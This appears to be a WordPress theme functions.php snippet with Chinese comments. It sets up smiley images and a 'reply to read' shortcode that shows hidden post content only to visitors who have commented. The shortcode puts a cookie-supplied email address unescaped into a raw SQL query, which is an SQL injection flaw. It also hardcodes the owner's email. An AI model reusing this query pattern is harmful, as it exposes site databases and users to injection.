//显示访客浏览器、操作系统信息include("show-useragent/show-useragent.php");//添加评论表情/*重定向以前使用,get_bloginfo('template_directory').'/images/smilies/'.$img;,在博客目录下创建一个source软连 */add_filter('smilies_src','custom_smilies_src',1,10);function custom_smilies_src ($img_src, $img, $siteurl){	return sahinn_blog_source_f().'/images/smilies/'.$img;}//修复smilies图片表情function smilies_reset() {    global $wpsmiliestrans, $wp_smiliessearch;     // don't bother setting up smilies if they are disabled    if ( !get_option( 'use_smilies' ) )        return;    $wpsmiliestrans = array(    ':mrgreen:' => 'icon_mrgreen.gif',    ':neutral:' => 'icon_neutral.gif',    ':twisted:' => 'icon_twisted.gif',      ':arrow:' => 'icon_arrow.gif',      ':shock:' => 'icon_eek.gif',      ':smile:' => 'icon_smile.gif',        ':???:' => 'icon_confused.gif',       ':cool:' => 'icon_cool.gif',       ':evil:' => 'icon_evil.gif',       ':grin:' => 'icon_biggrin.gif',       ':idea:' => 'icon_idea.gif',       ':oops:' => 'icon_redface.gif',       ':razz:' => 'icon_razz.gif',       ':roll:' => 'icon_rolleyes.gif',       ':wink:' => 'icon_wink.gif',        ':cry:' => 'icon_cry.gif',        ':lol:' => 'icon_lol.gif',        ':mad:' => 'icon_mad.gif',        ':sad:' => 'icon_sad.gif',          '8-)' => 'icon_cool.gif',          '8-O' => 'icon_eek.gif',          ':-(' => 'icon_sad.gif',          ':-)' => 'icon_smile.gif',          ':-?' => 'icon_confused.gif',          ':-D' => 'icon_biggrin.gif',          ':-P' => 'icon_razz.gif',          ':-o' => 'icon_surprised.gif',          ':-x' => 'icon_mad.gif',          ':-|' => 'icon_neutral.gif',          ';-)' => 'icon_wink.gif',        // This one transformation breaks regular text with frequency.        //  '8)' => 'icon_cool.gif',           '8O' => 'icon_eek.gif',           ':(' => 'icon_sad.gif',           ':)' => 'icon_smile.gif',           ':?' => 'icon_confused.gif',           ':D' => 'icon_biggrin.gif',           ':P' => 'icon_razz.gif',           ':o' => 'icon_surprised.gif',           ':x' => 'icon_mad.gif',           ':|' => 'icon_neutral.gif',           ';)' => 'icon_wink.gif',          ':!:' => 'icon_exclaim.gif',          ':?:' => 'icon_question.gif',    );}smilies_reset();//评论后查看隐藏内容function reply_to_read($atts, $content=null) {           extract(shortcode_atts(array("notice" => '<p class="reply-to-read">温馨提示: 此处内容需要<a href="#respond" title="评论本文">评论本文</a>后才能查看。</p>'), $atts));           $email = null;           $user_ID = (int) wp_get_current_user()->ID;           if ($user_ID > 0) {               $email = get_userdata($user_ID)->user_email;                 $admin_email = "ericzuobin@qq.com"; //博主Email            if ($email == $admin_email) {                   return $content;               }           } else if (isset($_COOKIE['comment_author_email_' . COOKIEHASH])) {               $email = str_replace('%40', '@', $_COOKIE['comment_author_email_' . COOKIEHASH]);           } else {               return $notice;           }           if (empty($email)) {               return $notice;           }           global $wpdb;           $post_id = get_the_ID();           $query = "SELECT `comment_ID` FROM {$wpdb->comments} WHERE `comment_post_ID`={$post_id} and `comment_approved`='1' and `comment_author_email`='{$email}' LIMIT 1";           if ($wpdb->get_results($query)) {               return do_shortcode($content);           } else {               return $notice;           }       }  add_shortcode('reply', 'reply_to_read');